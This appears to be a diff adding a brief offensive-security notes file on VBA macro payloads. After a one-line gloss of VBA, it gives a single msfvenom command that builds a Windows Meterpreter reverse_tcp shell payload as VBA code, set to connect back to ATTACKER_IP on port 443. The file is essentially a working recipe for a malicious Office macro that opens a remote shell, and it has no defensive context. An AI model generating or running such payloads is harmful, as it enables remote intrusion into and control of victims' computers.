@@ -1,0 +1,9 @@
+VBA = Visual Basic for Application
+
+Msfvenom payload :
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
